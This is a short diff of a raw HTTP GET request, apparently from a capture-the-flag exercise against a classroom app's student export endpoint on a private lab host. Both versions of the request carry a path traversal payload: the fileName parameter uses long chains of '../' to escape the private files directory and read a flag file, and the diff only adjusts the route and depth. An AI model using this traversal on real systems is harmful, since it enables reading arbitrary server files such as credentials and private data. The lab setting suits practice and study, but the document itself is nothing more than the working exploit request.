@@ -1,4 +1,4 @@
-GET /app.php/classroom/1/manage/student/export?role=student&fileName=/var/www/html/app/data/private_files/../../../../../../../../../../../home/ctf/a/../flag HTTP/1.1
+GET /web/classroom/1/manage/student/export?role=student&fileName=/var/www/html/web/app/data/private_files/../../../../../../../../../../../../a/../flag HTTP/1.1
 Host: 172.16.5.28:5053
 Connection: keep-alive
 Accept-Encoding: gzip, deflate
